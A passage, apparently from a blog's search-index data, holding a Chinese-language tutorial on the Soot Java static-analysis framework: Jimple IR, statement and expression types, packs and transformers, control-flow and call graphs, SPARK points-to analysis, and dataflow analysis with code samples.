lll.java代码如下：","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Soot","slug":"Soot","permalink":"https://0range228.github.io/tags/Soot/"}]},{"title":"Soot知识点整理","slug":"soot知识点整理","date":"2020-07-18T11:14:40.000Z","updated":"2021-07-02T11:41:44.767Z","comments":true,"path":"soot知识点整理/","link":"","permalink":"https://0range228.github.io/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/","excerpt":"序言 江山留胜迹，我辈复登临。 兜兜转转好几圈，发现还是用soot的人多。借此机会，再跟一遍tutorials，写点我自己的理解。 同步项目：MySootScript","text":"序言 江山留胜迹，我辈复登临。 兜兜转转好几圈，发现还是用soot的人多。借此机会，再跟一遍tutorials，写点我自己的理解。 同步项目：MySootScript SSASSA 是static single assignment 的缩写，也就是静态单赋值形式。 顾名思义，就是每个变量只赋值一次。 soot配置选项1234567891011Options.v().set_output_format(Options.output_format_jimple);//输出的形式Options.v().set_output_dir(\"sootOutput\");//输出目录Options.v().set_whole_program(true);//全程序分析Options.v().set_verbose(true);//显示详细信息PackManager.v().writeOutput(); //关键：启动输出。（不运行此语句不会进行输出）Options.v().set_no_bodies_for_excluded(true);//不加载被排除的类 /callgraph边会减少很多Options.v().set_allow_phantom_refs(true);//找不到对应的源代码就被称作是虚类（phantom class） 允许虚类存在 不报错Options.v().set_process_dir(Collections.singletonList(apkPath));//处理所有在dir中发现的类Options.v().setPhaseOption(“cg.spark”, “on”);//开启SPARK分析CallGraph soot的基本数据结构soot有一个很复杂的层次结构，比如Scene，SootClass，SootClass，SootMethod，Body，Local，Trap，Unit； Scene： 表示整个分析所发生的环境。 通过Scene可以设置提供给soot分析的所有的应用类、包含main方法的类和有关过程间分析的访问信息。 SootClass： 表示装入到soot中或者由soot创建的单个类。 在Scene中的各个类都是由SootClass类的实例表示的。 一个SootClass包含一个Java类所有相关的信息，例如这个类的类名、修饰符、父类、SootField、SootMethod链等。 SootField： 表示类的属性，也可以叫做域。 SootMethod： 表示一个类中的单个方法。 Body： Body接口用来表示方法的实现。 在soot中，一个Body隶属于一个SootMethod，即soot用一个Body为一个方法存储代码。 分析应用可以使用Body访问各种信息，如一组声明的局部变量、方法体内语句、以及方法体内处理的异常。 Chain： 链。 每个Body里面有三个主链，分别是Units链、Locals链、Traps链。 Units：方法体内的语句。 Locals：方法内的局部变量。 Traps：方法内的异常处理。 四种Body： BafBody、JimpleBody、ShimpleBody、GrimpBody，分别对应四种不同的中间表示法。 JimpleBody用得最多。 4种IR 主流IR Jimple 基于栈 java语言的字节码表示本来就是栈的，而象Dalvik 是基于寄存器的，在这点上Jimple基于栈 有类型 每一个参数都定义了Type，并且类型精度没有丢失，比如int $i0 基于三地址分析 三地址解析中会出现很多的中间变量 三地址同时会拆解一些高级特性，被分解成多个单位，包含一些低级操作，支持低端指令一般而言，三地址代码将包含大部分低级操作，即目标机所支持的指令。 此图参考 在body中有Units，Values，Traps，接下来细说。 Unit语句在Jimple中就是Stmt。 例如赋值语句： AssignStmt：x=y+z ##Jimple Stmt类型 核心语句：NopStmt，IdentityStmt，AssignStmt 负责过程内控制流 IfStmt , GotoStmt , SwitchStmt 负责过程间的控制流： InvokeStmt ,ReturnStmt,ReturnVoidStmt., ThrowStmt 监控语句：MonitorStmt 赋值语句：DefinitionStmt 其它类型：NopStmt, BreakponitStmt 已经不使用的语句RetStmt Soot为中间代码的翻译建立了一系列的基础设施。 AbstractStmtSwitch soot.jimple.AbstractJimpleValueSwitch 等等还有很多switch，他们都是针对不同的语句进行了很多情况的分析。 Value&amp;BoxValue： Local Constant Ref Expr 这里简单讲一下Expr接口，他又有一系列的实现，例如NewExpr和AddExpr，在下一节会详细介绍。 一般来说，一个Expr可以对若干个Value进行一些操作并且返回另一个Value； 1x = y + 2; 上面这是AssignStmt，他的leftOp是x，rightOp是一个AddExpr（y+2） AddExpr又包含了值y和2作为操作数，前者是一个局部变量，而后者是一个常量。 在Jimple中，我们强制要求所有的Value最多包含一个表达式。 下面写一些常用的： Local JimpleLocal local变量 TemporaryRegisterLocal $开头的临时变量 Constant各种常量 可以说是很完备了 最常用了也就是StringConstant和NumericConstant了。 Ref引用 相当于指针。RefTypes是以类名为参数。 ConcreteRef ArrayRef 指向数组 FieldRef 指向field StaticFieldRef 静态field的引用 InstanceFieldRef 指向的field是一个对象实例 IdentityRef CaughtExcrptionRef 指向捕获到的异常的引用 ParameterRef 函数参数的引用 ThisRef this的引用 BoxBox是指针！！！！！提供了对Soot对象的间接访问。一个Box提供了一个间接访问soot (Unit,Value)的入口，类似于Java的一个引用，当Unit包含另一个Unit的时候，需要通过Box来访问，Soot 里提供了两种类型的Box, 一个是ValueBox一个是UnitBox。 上图可以看出来： 一个Unit有多个UnitBox，但是每个UnitBox只能指向一个Unit。GotoStmt 需要知道目标的Unit是什么，所以一个Unit会包含其它的UnitBox，通过 UnitBox获取下一个Unit。 一个Value可以对应多个ValueBox，但是一个ValueBox只能对应一个Value，对于一个Unit，可以得到很多个ValueBox，包含着这条语句内部的所用到和所定义的语句。 两种Box： ValueBox，指向Values 对于一条Unit来说，他的ValueBox存储的是在这条语句内部所用到的和所定义的语句。 UnitBox，指向Units 以goto语句为例，UnitBox其实存的就是goto所指的下一跳节点。 switch语句，则会包含很多boxes i1=0 等于是一个Stmt, i1是一个Valuebox，里面包含这i0这个local 的value。 多说几句： DefBox是什么？ List defBoxes = ut.getDefBoxes(); 举例常量叠加： 1234int a = 1;int b = 2;int c = a + b;return c; 由于a,b的值都是常量，需要叠加一下，当然这部分soot内部已经实现了： 对于int c = a + b来说，这句话是一个赋值语句，也就是AssignStmt，在这个赋值语句中，左边是Local，右边是AddExpr，他们都是Value类型。 下面算法的逻辑： 对于这个AssignStmt来说，需要首先获取他的Boxes，这些Boxes里面包含了Value的指针。 遍历Boxes，cast为ValueBox，然后获取他的Value，如果是AddExpr的话，那就是我们想优化的。 对于AddExpr来说，获取他的左值和右值，也就是两个value。 如果都是常量IntConstant的话，那么就把他们的value加在一起。 重新给AssignStmt的box赋值，让他指向sum和的常量。 对于Unit语句类型来说，必须包含的方法有： 123public List getUseBoxes();public List getDefBoxes();public List getUseAndDefBoxes(); 这些方法会返回在这条Unit语句内部Use的，Define的，或者两者都看。会以List of ValueBox的形式返回。 对于getUseBoxes()方法，将返回所有使用的值；当然包括各种Expr表达式及其组成部分。 1public List getUnitBoxes(); 上面这个方法会返回一个List （UnitBox），包含所有被这个Unit所指向的其他Unit。 1public List getBoxesPointingToThis(); 上面这个方法会返回一个List（UnitBox），包含那些指向这个Unit的Unit语句。 123public boolean fallsThrough();public boolean branches(); //如：IfStmt、GotoStmt 处理在某条语句之后的执行流有关。 第一个方法：如果执行可以顺利流到紧挨着的下一条语句，就会返回True； 第二个方法：如果执行可以继续流下去，但是并不会流到紧挨着的下一条语句，返回True。 1public void redirectJumpsToThisTo(Unit newLocation); 上面这个方法会用getBoxesPointingToThis方法去改变所有曾经指向这个Unit的跳转，让他们都指向这个新的newLocation。 总结： 我们能够确定跳转到这个Unit的其他Unit（调用getBoxesPointingToThis()），也可以找到跳到的其他Unit（调用getUnitBoxes()）。 12345678public List&lt;ValueBox&gt; getUseBoxes();//返回Unit中使用的Value的引用public List&lt;ValueBox&gt; getDefBoxes();//返回Unit中定义的Value的引用public List&lt;ValueBox&gt; getUseAndDefBox();//返回Unit中定义并使用的Value的引用public List geUnitBoxes();//获得被这个unit跳转到的UnitxBox的Listpublic List getBoxesPointingTothis();//获得该unit作为跳转对象时，所有跳转本身的UnitBoxpublic boolean fallsThrough();//如果接下来执行后面挨着的unit，则为truepublic boolean branches();//如果执行时会跳转到其他别的unit，则返回true。如：IfStmt、GotoStmtpublic void rediectJumpsToThisTo(Unit newLocation);//该方法把跳转到该unit重定向到newLocation Stmt和Expr的区别Stmt的基本实现都在soot.jimple.internal中，我们把目光聚集到Jimple这种IR。关系图如下： 正如上图所示，soot.jimple包里面，internal包内部存放的是实现了Stmt的抽象类，没有在internal包内存放的是继承了Stmt接口的其余接口。 AbstractStmt在internal包内，最先实现Stmt接口的是AbstractStmt接口： 读到这里，我相信你应该有点感觉了，soot架构里面的抽象类应该都有对应的实现。 这也就是为什么，剩下的三个抽象类肯定还有具体的实现。 AbstractDefinitionStmt表示一个赋值语句 我们先看AbstractDefinitionStmt抽象类的实现 JAssignStmt 一个正常的复制语句 比如说可以给一个堆栈变量$stack5赋值 12$stack5 = newarray (java.lang.Object)[0]$stack4 = new pta.ptademo.A; $变量其实就是模拟了JVM中局部变量表里面的堆栈变量，本质上也是一种Local JIdentityStmt 通常指的是对变量赋值，这个变量既可以是显示的也可以是隐式的 函数传参，程序会帮你把从参数传入的变量，赋值给一个临时变量，给函数内部调用 1r1 := @parameter0: java.lang.String this变量 1r0 := @this: com.spring.Controller 两者区别！！！ 可以理解为： 一个IdentityStmt将特殊值，如参数、this或被捕获的异常，分配给一个Local。 所有 “正常 “的赋值，例如从一个Local到另一个Local，或者从一个Constant到一个Local，都是用AssignStmt表示的。 不同的IdentityStmts的共同点是它们分配的值都是 “神奇地从天而降”。在方法入口处，这些是参数和 “this”，而在异常处理程序中，这些是抛出的异常。换句话说，在处理程序开始的地方，在方法的主体里有一个带有异常引用的IdentityStmt是完全可以的，也是人们所期待的。Soot的唯一假设是，如果一个语句是Trap的目标，即处理程序的开始，那么该处理程序中的第一个语句应该是一个带有适当异常引用的IdentityStmt。 AbstractSwitchStmtswitch语句主要由于JVM对于不同的Switch语句，会生成不同的操作指令，从而也就有了两种Switch语句 JLookupSwitchStmt lookup类型的switch JTableSwitchStmt table类型的switch AbstractOpStmt四个实现类 类 表示 JEnterMonitorStmt 线程进入 JExitMonitorStmt 线程退出 JReturnStmt return语句 JThrowStmt throw语句 其他Stmt 直接写上 Stmt 含义 JInvokeStmt 调用方法的语句 JBreakpointStmt break语句 JGotoStmt go to语句 JIfStmt if 语句 JNopStmt nop跳转 JRetStmt jsr 基本不用了 JReturnStmt return语句 JReturnVoidStmt return void 语句 AbstractInvokeExpr表示调用的表达式 之前也提到过，invoke一共有五种： 类型 soot 具体用途 invokestatic JStaticInvokeExpr 调用static静态方法 invokevirtual JVirtualInvokeExpr 调用虚方法、final方法 invokeinterface JInterfaceInvokeExpr 调用接口方法，在运行时搜索实现了这个方法的对象，进行合适的调用 invokespecial JSpecialInvokeExpr 调用实例方法，init构造方法、private、父类方法 invokedynamic JDynamicInvokeExpr 动态解析出需要调用的方法，然后执行 invoke lambda 这五种被soot指派了两个抽象类来实现： 调用方法 静态static + 动态dynamic JStaticInvokeExpr JDynamicInvokeExpr AbstractInstanceInvokeExpr调用一个变量调用自身的方法 JVirtualInvokeExpr JInterfaceInvokeExpr JSpecialInvokeExpr 这部分soot还有一种划分方式， InvokeExpr InstanceInvokeExpr JVirtualInvokeExpr JInterfaceInvokeExpr JSpecialInvokeExpr StaticInvokeExpr JStaticInvokeExpr DynamicInvokeExpr JDynamicInvokeExpr AbstractBinopExpr一堆数学操作，加减乘除、逻辑与或非、比较、位运算 其他Expr 直接写上 Expr 含义 JCastExpr cast 强制类型转换 JInstanceOfExpr instanceof JNewMultiArrayExpr 多维数组 JNewExpr new JNewArrayExpr 创建new array JLengthExpr 数组长度 JNegExpr 否定一个int变量 处理阶段Pack/Transformer程序内分析： 上面这张图是程序内分析大致框架图，入口点是Jimple，用户可以在转化阶段加入一些分析相关的信息。这个可以在jtp（Jimple Transformation pack）阶段来实现。 代码： 12345678910PackManager.v().getPack(\"jtp\").add(new Transform(\"jtp.myTransform\", new BodyTransformer()&#123; @Override protected void internalTransform(Body b, String phaseName, Map options) &#123; // TODO Auto-generated method stub ... &#125;&#125; 上述代码就是在jtp pack中插入小步骤myTransform，但soot的执行流执行完自定义的myTransform后，将继续沿着执行流执行，自定义的小步骤就像soot的一个插件，并不影响其他的执行流顺序。 程序间分析： 第二张图是程序间程序分析 代码： 1234567891011PackManager.v().getPack(\"wjtp\").add( new Transform(\"wjtp.myTransform\", new SceneTransformer() &#123; @Override protected void internalTransform(String arg0, Map&lt;String, String&gt; arg1) &#123; // TODO Auto-generated method stub ... &#125; &#125;)); 上述代码就是在wjtp pack中插入一个小步骤myTransform。 但soot的执行流执行完自定义的myTransform后，将继续沿着执行流执行，自定义的小步骤就像soot的一个插件，并不影响其他的执行流顺序。 这里总结一下各个阶段的命名规则： 第一个字母表示中间代码种类： j=Jimple s=Shimple b=Baf g=Grimp 第二个字母表示该阶段做的事情： b=body 方法体创建阶段 t=transform 用户自定的创建阶段 o=optimizations 优化阶段 a=annotion 属性生成阶段 最后的P： p=pack 处理阶段 核心阶段与小阶段在Soot的核心阶段分为PP-&gt;CG-&gt;TP-&gt;OP-&gt;AP，Soot支持多IR分析，但在核心过程中只支持Jimple, Shimple, 在Pack中可以插入自定义的Transform，这样就可以在每一个分析阶段加入自己的分析步骤，从而实现自定义分析的能力。 但是一开始jb都是必须要做的，生成jimplebody，下图中，jb阶段就是核心阶段，下面罗列的就是小阶段： 具体每个小阶段是干嘛的，可以看这里 PP Pre-processing Pack 是第一个分析的Pack,该Pack允许你自定义一些自己的transform在构建call graph之前。 CG CG Call Graph，调用图，调用图是静态层序分析的关键，方法调用图包含着整个函数调用的关系图。 body packsBody Packs 基于Body 的Packs分析，对不同的IR有不同的Packs。 和前面的核心Packs不同的是，这里只是基于Body进行分析，每个Packs依然可以自己定义Transform，区别是使用不同的Transformer，在Body packs里使用的是BodyTransformer。 1protected abstract void internalTransform(Body b, String phaseName, Map&lt;String, String&gt; options); internalTransform里面包含了Body 对象 与核心的Pack分析不同的是，当分析到Body的Packs的时候，Soot会启动多线程进行Pack的分析。 在Soot里，每个阶段都又对应的pack来完成。 Pack其实具体来说就是一组变换器(Transformer)，每个变换器对应着相应的子阶段。 当Pack被调用时，它按照执行顺序执行每一个Tranformer。 提供拓展机制的是那些允许用户自定义变换的Pack： jtp：Jimple-transformation-pack stp：Shimple-transformation-pack 在不改变Soot自身的情况下，用户往往可以自定义满足需求的类（变换器），然后将其注入到这些pack中，之后调用soot.Main()，使其进入到Soot的正常流程调度中。 TransformerTransformer是Soot的变换器，允许用户自定义。 Soot变换器通常是继承两种： BodyTransformer：针对单个方法体，过程内，进行变换； SceneTransformer：针对整个应用，过程间，进行变换。 这两种方法下，变换器类都必须重构internalTransform方法，在这个方法里对被分析的代码执行某种变换。 你的transformer也可以分开写： 12345678910111213141516171819202122232425262728293031323334PackManager.v().getPack(\"jtp\").add(new Transform(\"jtp.myAnalysis\", new MyAnalysis()));PackManager.v().runPacks();System.out.println(Scene.v().getCallGraph().size());PackManager.v().writeOutput();//MyAnalysis.java文件public class MyAnalysis extends BodyTransformer&#123; protected void internalTransform(final Body body,String phase, @SuppressWarnings(\"rawtypes\")Map options)&#123; for (SootClass c:Scene.v().getApplicationClasses()) &#123; System.out.println(\"[sootClass]\"+c); for(SootMethod m:c.getMethods()) &#123; System.out.println(\"[sootMethod]\"+m); if(m.isConcrete()) &#123; Body b=m.retrieveActiveBody(); System.out.println(\"[body]\"+b); Iterator&lt;Unit&gt; i=b.getUnits().snapshotIterator(); while(i.hasNext()) &#123; Unit u=i.next(); &#125; &#125; &#125; &#125; &#125;&#125; 控制流图 CFGsoot有两种类型的控制流图(两个抽象类，均实现DirectedGraph接口)： UnitGraph BlockGraph 区别： UnitGraph是语句图，结点是Units。 BlockGraph是基本控制流图，结点由基本块BasicBlocks组成。 共同点： 首先这两种类型图的表示是相通的。 该接口中的API们，可以获取到： 图的入口节点和出口节点； 一个给定节点的前驱结点和后继结点； 一个以某种未明确规定的顺序和节点数在图中进行迭代的迭代器。 图的大小规模（节点数） 在这些基础上就可以开发对任意DirectedGraph有向图进行处理的方法。 实际上，UnitGraph和BlockGraph都是抽象类，Soot自己也实现很多实例化的子类。 例如CompleteUnitGraph、BriefUnitGraph、CompleteBlockGraph、BriefBlockGraph等。 具体在soot.toolkits.graph有实现说明。 继承实现关系 语句图UnitGraph巧妙之处：数据的关系与数据的内容进行了分离。 UnitGraph只是将Unit中的关系进行了保存，并不会改动Unit，Body的内容。 soot中UnitGraph是一个抽象程度较高的语句图。 重点说一下UnitGraph： UnitGraph的优点是简化了控制流图，没有了基本块的概念。 使用它可以简化传统的固定点数据流分析的实现。(fixed point data flow analysis) 但是缺点是由于没有了基本块，那么也就增加了分析时间的开销。 UnitGraph的四个子类继承UnitGraph的有4种： BriefUnitGraph 【用得最多】 EnhancedUnitGraph ExceptionalUnitGraph TrapUnitGraph API： BriefUnitGraph： 【正常，异常分离】BriefUnitGraph将正常的流程，与异常的处理流程进行了分离。（不相交，在最后才进行汇聚）；不包含针对exception的边 ExceptionalUnitGraph： 【融合】将正常流程与异常流程进行了融合，而不再是分离的。包含exception的边 包含从throw到catch的边，soot里面叫Trap 它还会计算语句中隐含的异常抛出 会有一条边从抛出异常那条语句的前驱节点指向异常处理的第一条语句Unit 如果包含异常的语句包含一些副作用，那么有副作用的边也会被添加到图里面 TrapUnitGraph： 【相对于ExceptionalUnitGraph】一些很普通的语句也会跳转到异常流程中。（比如nop,goto[?=nop]）—-&gt;认为try 中包含的所有的语句都有可能触发异常。 边是从trap语句连接到trap handler，例如try块 对于那些隐藏异常抛出的语句，这类图在他们的前驱节点并不会抛出一条边到handler 但是在那些隐藏异常抛出的语句本身会抛出一条语句指向handler 通过以下代码对给定的函数创建CFG： 1UnitGraph g = new ExceptionalUnitGraph(body); Host &amp; Tag soot层次如下图： Tag的接口由Host负责。 Call Graph &amp; Point-to CG &amp; CFG &amp; ICFGCallGraph &amp; Control Flow Graph &amp; Interprocedural Control-Flow Graph CG代表的是整个程序中方法之间调用关系的图，图中节点是函数，边代表的是调用关系。 CFG代表的是一个方法内程序执行流的图，图中节点是语句组成的基本块，边代表执行流。 CFG上条件语句节点的后缀会有多个，表示其后可能执行的不同branches。 ICFG就是CG+CFG，可以看作是CG和CFG信息的叠加。ICFG可以看做是给所有方法的CFG加上这些方法之间互相调用的边（CG）所形成的图。调用边（call edge）从调用语句（call site）连到被调方法（callee）的入口。与CG不同的是，ICFG除了调用边，还包含相应的返回边（return edge），从callee的出口连到call site之后执行的下一个语句。 CG Call Graph调用图，调用图是静态分析的关键，方法调用图包含着整个函数调用的关系图。 edge： Querying Call Graph Reachable Methods记录从entry method开始可以到达的方法们 Transitive Targets CallGraph结构： Call Graph对象里包含了所有的Edges的集合，同时也包含了了几个关键Map src Map target Map unit Map 这些Map的Key是SootMethod，Unit而Value是Edge，为了更快的找到SootMethod或者Unit对应的Edge。 CallGraph构建 Call Graph是方法的调用图，要画出方法的调用图是需要起始点的，也就是我们常说的EntryPoint。 在全程序分析的模式下，当一个调用图构建时，我们可以用Scene类里面的getCallGraph方法。 包含3个处理的办法， CHA SPARK Paddle, 其中默认生成call graph使用的是CHA，CHA生成速度快，但是是最不准确的。 CHA是最简单的分析方式，它是默认程序中所有的路径都是连通的。 12345CHATransformer.v().transform();SootClass a = Scene.v().getClass(\"testers.A\");SootMethod src = Scene.v().getMainClass().getMethodByName(\"doStuff\");CallGraph cg = Scene.v().getCallGraph(); 这里前提是必须开启全局模式： 12Options.v().set_whole_program(true);PackManager.v().runPacks(); 举例： 123456789101112...Options.v().setPhaseOption(\"cg.spark\", \"on\");//SPARK生成的call graph更准确Scene.v().loadNecessaryClasses();//加载相关的类//设置call graph的入口点SootMethod entryPoint = app.getEntryPointCreator().createDummyMain();Options.v().set_main_class(entryPoint.getSignature());Scene.v().setEntryPoints(Collections.singletonList(entryPoint));System.out.println(entryPoint.getActiveBody());//就绪后开始运行PackManager.v().runPacks();//获得运行之后的结果。（call graph相关的信息）System.out.println(Scene.v().getCallGraph().size()); 这里分析一个简单的程序： 12345678910111213141516171819public class CallGraph &#123; public static void main(String[] args) &#123; doStuff(); &#125; public static void doStuff() &#123; new D().foo(); &#125;&#125;class D&#123; public void foo() &#123; bar(); &#125; public void bar() &#123; &#125;&#125; soot code： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class Test &#123; public static final String className = \"demo.CallGraph\"; public static final String methodName = \"doStuff\"; public static final String sourceDirectory = System.getProperty(\"user.dir\")+ File.separator + \"target\" + File.separator + \"classes\"; public static void setupSoot()&#123; G.reset(); Options.v().set_prepend_classpath(true); Options.v().set_allow_phantom_refs(true); Options.v().set_soot_classpath(sourceDirectory); Options.v().set_output_format(Options.output_format_jimple); Options.v().set_process_dir(Collections.singletonList(sourceDirectory)); Options.v().set_whole_program(true); Scene.v().loadNecessaryClasses(); PackManager.v().runPacks(); SootClass sootClass = Scene.v().loadClassAndSupport(className); sootClass.setApplicationClass(); &#125; public static void main(String[] args) throws IOException &#123; setupSoot();// SootClass sc = Scene.v().forceResolve(className, SootClass.BODIES);也可以 SootClass sc = Scene.v().getSootClass(className); SootMethod srcMethod = sc.getMethodByName(methodName); //设置入口点 List&lt;SootMethod&gt; entrypoint = new ArrayList&lt;&gt;(); entrypoint.add(srcMethod); Scene.v().setEntryPoints(entrypoint); PackManager.v().getPack(\"wjtp\").add(new Transform(\"wjtp.myTransform\", new SceneTransformer() &#123; @Override protected void internalTransform(String s, Map&lt;String, String&gt; map) &#123; CHATransformer.v().transform(); SootClass sc = Scene.v().forceResolve(className, SootClass.BODIES); SootMethod srcMethod = sc.getMethodByName(methodName); CallGraph cg = Scene.v().getCallGraph(); Iterator&lt;MethodOrMethodContext&gt; targets = new Targets(cg.edgesOutOf(srcMethod)); while(targets.hasNext())&#123; SootMethod tgt = (SootMethod) targets.next(); System.out.println(srcMethod+\" may call \"+tgt); &#125; &#125; &#125;)); PackManager.v().runPacks(); &#125;&#125; 查看doStuff能调用哪个方法，CHA结果： 发现并不是绝对的准确的结果 备注： PackMananger是负责进行阶段处理的，它控制着各种执行的运行，不启动则不会运行相应的阶段。 SparkSpark分析 参考 Spark针对的是对于Java的指向分析，支持 基于集合的分析，以及 基于等值的分析。 但是，Spark提供的是基于上下文不敏感的子集的点对点分析。 指向分析（points-to）只是SPARK分析的一部分，一系列不同层次，不同方面的分析，可以通过配置options来实现。 123456789HashMap opt = new HashMap();opt.put(\"verbose\",\"true\");opt.put(\"propagator\",\"worklist\");opt.put(\"simple-edges-bidirectional\",\"false\");opt.put(\"on-fly-cg\",\"true\");opt.put(\"set-impl\",\"double\");opt.put(\"double-set-old\",\"hybrid\");opt.put(\"double-set-new\",\"hybrid\");SparkTransformer.v().transform(\"\",opt); 解读： 123456- verbose. (设定SPARK在分析过程中，打印多种信息【提示信息】)- propagator SPARK. (包含两个传播算法，原生迭代算法，基于worklist的算法)- simple-edges-bidirectional. (如果设置为真，则所有的边都为双向的)- on-fly-cg.（通过设置此选项，进行更加精确的points-to分析，得到精确的call graph）- set-impl. (描述points-to集合的实现。可能的值为hash,bit,hybrid,array,double)- double-set-old以及double-set-new. SPARK运行结果： 解读： 左边列的数字表明，变量初始化的点。（比如：[4,8] Container intersect? false，中的数字表示在第4行初始化的变量，以及在第8行初始化的变量 ） 右边列表示，两个变量的指向的集合中交集是否为空。不空为true,空为false。 【结果分析】可以看出，c1自己与自己是有交集的。c1与c2是没有交集的。（c1, c3也是如此） Point-tointerface 12345678910111213reachingObjects(Local) 返回指向某个Local变量的指针集合PointsToSetx = yreachingObjects(SootField) 返回指向某个静态属性的指针集合PointsToSetx = C.f reachingObjects(Local,SootField) 返回指向某个实例对象的field指针集合PointsToSetx = y.f possibleTypes() 返回某个对象的所有可能类型returns a set of the possible types of the objects in the points-to sethasNonEmptyIntersection(PointsToSet) 判断两个指针集合是否重叠（重叠当然就是alias别名关系） 例子a123456o.m()如果想知道上面调用中，o对象的所有类型Local o;PointsToAnalysis pa = Scene.v().getPointsToAnalysis();PointsToSet ptset = pa.reachingObjects( o );java.util.Set types = ptset.possibleTypes() 例子b123456789101112x.f = 5;y.f = 6;z = x.f;如果想判断x,y是否是别名关系Local x, y;PointsToAnalysis pa = Scene.v().getPointsToAnalysis();PointsToSet xset = pa.reachingObjects( x );PointsToSet yset = pa.reachingObjects( y );if(xset.hasNonEmptyIntersection(yset))// they’re possibly aliased 数据流分析在soot里面分为过程内数据流分析和过程间数据流分析。 程序可以看成是状态（数据）和状态之间的转移（控制）两部分，因为状态转移的条件都被忽略了，核心分析的部分是状态数据在转移过程中的变化，所以叫做数据流分析。 首先，总体来说： 每个语句相当于一个小的加工厂，加工厂加工需要一定的原料（输入 in）,并且会产生一定的效果（输出 out）。 out = in - kll +gen这个公式反映了数据流分析的本质，这让数据在语句中真正流动起来（在数据流分析中）。 kill和gen是主要依赖于语句本身的。比如说，a = 100这个语句的作用是将a中之前的值抹去（kill）,同时放入 100的值（gen）。 out反映的是语句处理之后造成的后果。 近似分析对于IfStmt来说，会出现branch分叉，那么对于汇聚点来说，就会存在Locals的不确定态。 近似的两种级别 must 取交集，分析的结果一定被包含于正确答案之内。 may 取并集，分析的结果包含正确的答案。 举例： may：-2 &lt; a &lt; 5 must: 0 &lt; a &lt; 2 敏感性程序分析的精度通常是和敏感性相关的。主要介绍下面几种敏感性： 上下文敏感性 context-sensitivity 路径敏感性 path-sensitivity 流敏感性 flow-sensitivity 谭添老师总结得很好: 通常所说的xxx-sensitive是指静态分析中用于降低误报（false positive）的技术，最常提的xxx正是所说的path, context以及flow。要具体解释这几个概念，首先我们来看看静态分析怎么产生false positive误报，然后我们再来看看如何用这几个技术（或者说概念）消除相应的false positive。 我们做静态分析时，无论是分析源代码还是目标代码，我们分析的对象（方法、语句、变量）都只有一份：同一个方法我们只会写一个方法体（方法体里的语句也就只有一份），同一个变量我们只会声明一次。然而动态运行程序的时候： 一个方法可能会被调用N次，每次调用的上下文可以不一样，不同上下文中这个方法里变量的值会不同； 一个方法里，一个变量在不同位置的值也会不一样。例如一个变量v，在方法执行到第1行和第10行的值会不同； 一个方法里同一个位置的变量的值在程序执行不同路径时也不一样。例如方法foo第10行要用变量v，第10行之前有一个if-else分支会修改v的值，那么程序途径true branch和false branch到达foo第10行时，v的值又不同。 按照我的理解，xxx-sensitive就是在静态分析时，按照xxx给程序里的对象（模拟动态运行）创建“分身”（或者说按照xxx区分分析对象）：按照上下文区分叫做context-sensitive；按照位置区分叫做flow-sensitive；按照路径区分叫做path-sensitive。区分之后再分析可以减少false positive。但是静态不可能完全模拟动态的所有情况，因为一旦有递归和循环，理论上你写下的方法和变量就能产生无穷无尽的“分身”。所以静态分析只能或多或少地通过xxx-sensitive技术减少false positive，而不可能消除。 按照定义：path-sensitive最准，flow-次之，context-最差 按照上下文区分：context-sentitive在提到context-sensitive 时一般context专指function call context，方法调用上下文。 只关心function之间的数据传递（参数、返回值、side-effect）而忽略了同一函数在不同call side下不同的context，即忽略了call stack。将call site和return当作goto，并添加一些赋值语句。 按照位置区分：flow-sentitive和前两个相比，flow-sensitive 的概念有些混乱。 flow-sensitive要关注statements之间的先后顺序。 flow-insensitive是把statements当作一个集合来看的，各个statement之间没有顺序，所以control flow statement（if、while一类的）可以直接删除； 从SSA的角度来看，path-insensitive是在处理Phi node的时候丢弃分支的信息，只把各个分支来的所有值给merge。path-sensitive是要保留分支信息。 按照路径区分：path-sentitivepath-sensitive其实就是flow-sensitive的一个特例，可以看作是特例或者说携带更高精度的信息的做法。 if、while静态分析时不知道动态的执行路线（path），所以一般会把它们不同的分支的数据流集merge起来。而path-sensitive则针对不同的路径的数据集不会merge，而是分别进行分析。 举例： 12345if (a &gt; 0) &#123; x = 1;&#125; else &#123; x = 2;&#125; 在这段代码的结尾x 的分析结果是如果a &gt; 0 则为1，a &lt;= 0 则为2。 这样分析的精度就高了很多，但是付出的代价是顺着control flow，path 的『分情况讨论』数量随指数增长。当然也有一些优化策略可以在某些情况下降低这个复杂度（比如property simulation）。 soot实现数据流分析过程内数据流分析 在sootwiki有说到： 过程内数据分析是在以UnitGraph为主的cfg上操作的。 UnitGraph包含语句作为节点，如果控制可以从源节点代表的语句流向目标节点代表的语句，那么两个节点之间就有一条边。 数据流分析将两个元素与UnitGraph中的每个节点联系起来，通常是两个集合：一个inset和一个outset。这些集合首先初始化，然后沿着语句节点在UnitGraph中传播，直到达到一个固定点fixed-point。 最后，你要做的就是在每个语句前后检查inset与outset。通过分析的设计，你的集合特征应该准确地告诉你所需要的信息。 四步走 前向or后向？是否考虑分支情况？ 问题域？那种语句会影响？ 如何为每一种IR形式的语句写transfer function？ 如何说明开始情况下的近似值？ 义务，必须要做的事情，关键方法 实现你的分析框架，一定要做的事情： 必须继承FlowAnalysis抽象类 实现抽象方法 ： merge() and copy() 实现数据流分析函数 ：flowThrough() 实现初始化函数：newInitialFlow() and entryInitialFlow() 框架的构造函数内必须调用 doAnalysis() 这里面doAnalysis() ，其实soot已经实现了在CFG上运用worklist算法进行程序内数据流分析。 三种数据流分析 ForwardFlowAnalysis：以UnitGraph的entry statement作为开始并开始传播； BackwardsFlowAnalysis：以UnitGraph的exit node(s)作为分析并且向后开始传播（当然可以将UnitGraph转换产生inverseGraph，然后再使用ForwardFlowAnalysis进行分析）； ForwardBranchedFlowAnalysis：本质上也是Forward分析，但是它允许你在不同分支处传递不同的flow sets。例如：如果传播到如if(p!=null)语句处，当“p is not null”时，传播进入“then”分支，当“p is null”时传播进入“else”分支（Forward、backward分析都在分支处会将分析结果merge合并掉）。 在soot中，FlowAnalysis是一个抽象类。 ForwardFlowAnalysis ForwardFlowAnalysis是抽象类，继承关系如下： 1AbstractFlowAnalysis&lt;N,A&gt; -&gt; FlowAnalysis&lt;N,A&gt; -&gt; ForwardFlowAnalysis&lt;N,A&gt; ForwardFlowAnalysis有两个参数： N：节点种类。通常是Unit。 A：Abstraction Type 